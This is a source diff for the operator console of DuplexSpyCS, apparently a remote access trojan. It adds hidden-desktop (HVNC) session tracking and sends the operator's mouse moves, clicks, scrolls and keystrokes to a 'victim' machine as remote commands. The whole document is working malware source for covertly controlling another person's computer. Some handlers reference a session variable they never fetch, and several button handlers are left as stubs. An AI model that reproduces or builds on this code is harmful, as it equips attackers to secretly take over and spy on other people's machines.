@@ -35,12 +35,21 @@ namespace DuplexSpyCS
         /// </summary>
         public struct stHvncSession
         {
+            public bool bSessionStart;
+
             public string szDesktopName;
             public string szExeFilePath;
             public string szArguments;
             public TabPage page;
 
             public bool bIsNull { get { return string.IsNullOrEmpty(szDesktopName); } }
+
+            public int nLeft;
+            public int nTop;
+            public int nWidth;
+            public int nHeight;
+
+            public Point ptLastLocation;
         }
 
         public struct stToolStripControls
@@ -55,12 +64,17 @@ namespace DuplexSpyCS
 
             public ToolStripComboBox? comboDelay = null;
 
-            public ToolStripButton? btnMouse = null;
-            public ToolStripButton? btnKeyboard = null;
-            public ToolStripButton? btnFPS = null;
-            public ToolStripButton? btnTs = null;
+            private ToolStripButton? btnMouse = null;
+            private ToolStripButton? btnKeyboard = null;
+            private ToolStripButton? btnFPS = null;
+            private ToolStripButton? btnTs = null;
 
             public PictureBox? pictureBox = null;
+
+            public bool bEnableMouse { get { return  btnMouse == null ? false : btnMouse.Checked; } }
+            public bool bEnableKeyboard { get { return btnKeyboard == null ? false : btnKeyboard.Checked; } }
+            public bool bEnableFPS { get { return btnFPS == null ? false : btnFPS.Checked; } }
+            public bool bEnableTs { get { return btnTs == null ? false : btnTs.Checked; } }
 
             public stToolStripControls(TabPage page)
             {
@@ -69,7 +83,7 @@ namespace DuplexSpyCS
                 if (page == null)
                     return;
 
-                ToolStrip ts = (ToolStrip)page.Controls[0];
+                ToolStrip ts = (ToolStrip)page.Controls[1];
 
                 btnScreenshot = (ToolStripButton)ts.Items[0];
                 btnStart = (ToolStripButton)ts.Items[1];
@@ -83,7 +97,7 @@ namespace DuplexSpyCS
                 btnFPS = (ToolStripButton)ts.Items[10];
                 btnTs = (ToolStripButton)ts.Items[11];
 
-                PictureBox pb = (PictureBox)page.Controls[1];
+                PictureBox pb = (PictureBox)page.Controls[0];
                 pictureBox = pb;
             }
         }
@@ -119,6 +133,13 @@ namespace DuplexSpyCS
                         if (lsMsg[2] == "init")
                         {
                             var ls2d = clsEZData.fnStrTo2dList(lsMsg[3]);
+
+                            int[] info = lsMsg[4].Split(',').Select(x => int.Parse(x)).ToArray();
+                            int nLeft = info[0];
+                            int nTop = info[1];
+                            int nWidth = info[2];
+                            int nHeight = info[3];
+
                             foreach (var ls in ls2d)
                             {
                                 stHvncSession session = new stHvncSession()
@@ -126,6 +147,11 @@ namespace DuplexSpyCS
                                     szDesktopName = ls[0],
                                     szExeFilePath = ls[1],
                                     szArguments = string.Empty, // todo
+
+                                    nLeft = nLeft,
+                                    nTop = nTop,
+                                    nWidth = nWidth,
+                                    nHeight = nHeight,
                                 };
 
                                 TabPage? page = fnAddNewPage(session);
@@ -359,28 +385,28 @@ namespace DuplexSpyCS
             btnMouse.CheckOnClick = true;
             btnMouse.Click += (s, e) =>
             {
-
+                // do something
             };
 
             ToolStripButton btnKeyboard = new ToolStripButton("Keyboard");
             btnKeyboard.CheckOnClick = true;
             btnKeyboard.Click += (s, e) =>
             {
-
+                // do something
             };
 
             ToolStripButton btnFPS = new ToolStripButton("FPS");
             btnFPS.CheckOnClick = true;
             btnFPS.Click += (s, e) =>
             {
-
+                // do something
             };
 
             ToolStripButton btnTs = new ToolStripButton("Timestamp");
             btnTs.CheckOnClick = true;
             btnTs.Click += (s, e) =>
             {
-
+                // do something
             };
 
             ToolStrip ts = new ToolStrip();
@@ -413,6 +439,158 @@ namespace DuplexSpyCS
             pb.Dock = DockStyle.Fill;
             pb.SizeMode = PictureBoxSizeMode.Zoom;
             pb.BackColor = Color.Gray;
+            pb.BringToFront();
+
+            pb.MouseMove += (s, e) =>
+            {
+                TabPage page = tabControl1.SelectedTab;
+                if (page == null)
+                    return;
+
+                var control = new stToolStripControls(page);
+                if (control.bIsNull || control.pictureBox == null || !control.bEnableMouse)
+                    return;
+
+                PictureBox pb = control.pictureBox;
+                if (pb.Image == null)
+                    return;
+
+                Image img = pb.Image;
+                Size pb_size = pb.ClientRectangle.Size;
+                var wfactor = (double)img.Width / pb.ClientSize.Width;
+                var hfactor = (double)img.Height / pb.ClientSize.Height;
+
+                var resize_factor = Math.Max(wfactor, hfactor);
+                var img_size = new Size((int)(img.Width / resize_factor), (int)(img.Height / resize_factor));
+
+                double pb_xMid = (double)pb_size.Width / 2;
+                double pb_yMid = (double)pb_size.Height / 2;
+
+                double screen_LB = pb_xMid - img_size.Width / 2;  // Left boundary
+                double screen_RB = pb_xMid + img_size.Width / 2;  // Right boundary
+                double screen_TB = pb_yMid - img_size.Height / 2; // Top boundary
+                double screen_BB = pb_yMid + img_size.Height / 2; // Bottom boundary
+
+                if (e.Location.X < screen_LB || e.Location.X > screen_RB) // X invalid region
+                    return;
+                if (e.Location.Y < screen_TB || e.Location.Y > screen_BB) // Y invalid region
+                    return;
+
+                var session = fnGetSession(page);
+                int nWidth = session.nWidth;
+                int nHeight = session.nHeight;
+
+                double remote_wfactor = img.Width / (pb.ClientRectangle.Width - 2 * screen_LB);
+                double remote_hfactor = img.Height / (pb.ClientRectangle.Height - 2 * screen_TB);
+
+                double xLoc = (e.Location.X - screen_LB) * remote_wfactor;
+                double yLoc = (e.Location.Y - screen_TB) * remote_hfactor;
+
+                m_victim.fnSendCommand(new string[]
+                {
+                    "hvnc",
+                    "mouse",
+                    session.szDesktopName,
+                    "MOVE",
+                    ((int)xLoc).ToString(),
+                    ((int)yLoc).ToString(),
+                    "0",
+                });
+
+                session.ptLastLocation = new Point((int)xLoc, (int)yLoc);
+                page.Tag = session;
+            };
+            pb.MouseDown += (s, e) =>
+            {
+                TabPage page = tabControl1.SelectedTab;
+                if (page == null)
+                    return;
+
+                var control = new stToolStripControls(page);
+                if (control.bIsNull || control.pictureBox == null || !control.bEnableMouse)
+                    return;
+
+                var session = fnGetSession(page);
+                if (session.bIsNull)
+                    return;
+
+                Point ptLast = session.ptLastLocation;
+                string action = string.Empty;
+
+                if (e.Button == MouseButtons.Left)
+                    action = "LD";
+                else if (e.Button == MouseButtons.Right)
+                    action = "RD";
+
+                if (string.IsNullOrEmpty(action))
+                    return;
+
+                m_victim.fnSendCommand(new string[]
+                {
+                    "hvnc",
+                    "mouse",
+                    session.szDesktopName,
+                    action,
+                    ptLast.X.ToString(),
+                    ptLast.Y.ToString(),
+                    "0",
+                });
+            };
+            pb.MouseUp += (s, e) =>
+            {
+                TabPage page = tabControl1.SelectedTab;
+                if (page == null)
+                    return;
+
+                var control = new stToolStripControls(page);
+                if (control.bIsNull || control.pictureBox == null || !control.bEnableMouse)
+                    return;
+
+                Point ptLast = session.ptLastLocation;
+                string action = string.Empty;
+
+                if (e.Button == MouseButtons.Left)
+                    action = "LU";
+                else if (e.Button == MouseButtons.Right)
+                    action = "RU";
+
+                if (string.IsNullOrEmpty(action))
+                    return;
+
+                m_victim.fnSendCommand(new string[]
+                {
+                    "hvnc",
+                    "mouse",
+                    session.szDesktopName,
+                    action,
+                    ptLast.X.ToString(),
+                    ptLast.Y.ToString(),
+                    "0",
+                });
+            };
+            pb.MouseWheel += (s, e) =>
+            {
+                TabPage page = tabControl1.SelectedTab;
+                if (page == null)
+                    return;
+
+                var control = new stToolStripControls(page);
+                if (control.bIsNull || control.pictureBox == null || !control.bEnableMouse)
+                    return;
+
+                Point ptLast = session.ptLastLocation;
+
+                m_victim.fnSendCommand(new string[]
+                {
+                    "hvnc",
+                    "mouse",
+                    session.szDesktopName,
+                    "SC",
+                    ptLast.X.ToString(),
+                    ptLast.Y.ToString(),
+                    e.Delta.ToString(),
+                });
+            };
 
             return page;
         }
@@ -439,6 +617,8 @@ namespace DuplexSpyCS
 
         void fnSessionStart(stHvncSession session, int nDelay = 100)
         {
+            session.bSessionStart = true;
+
             m_victim.fnSendCommand(new string[]
             {
                 "hvnc",
@@ -453,6 +633,8 @@ namespace DuplexSpyCS
 
         void fnSessionStop(stHvncSession session)
         {
+            session.bSessionStart = false;
+
             m_victim.fnSendCommand(new string[]
             {
                 "hvnc",
@@ -636,6 +818,54 @@ namespace DuplexSpyCS
         private void toolStripMenuItem7_Click(object sender, EventArgs e)
         {
 
+        }
+
+        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
+        {
+            TabPage page = tabControl1.SelectedTab;
+            if (page == null)
+                return;
+
+            var control = new stToolStripControls(page);
+            if (control.bIsNull || !control.bEnableKeyboard)
+                return;
+
+            var session = fnGetSession(page);
+            if (session.bIsNull)
+                return;
+
+            m_victim.fnSendCommand(new string[]
+            {
+                "hvnc",
+                "keyboard",
+                session.szDesktopName,
+                "down",
+                ((int)e.KeyCode).ToString(),
+            });
+        }
+
+        private void tabControl1_KeyUp(object sender, KeyEventArgs e)
+        {
+            TabPage page = tabControl1.SelectedTab;
+            if (page == null)
+                return;
+
+            var control = new stToolStripControls(page);
+            if (control.bIsNull || !control.bEnableKeyboard)
+                return;
+
+            var session = fnGetSession(page);
+            if (session.bIsNull)
+                return;
+
+            m_victim.fnSendCommand(new string[]
+            {
+                "hvnc",
+                "keyboard",
+                session.szDesktopName,
+                "up",
+                ((int)e.KeyCode).ToString(),
+            });
         }
     }
 }
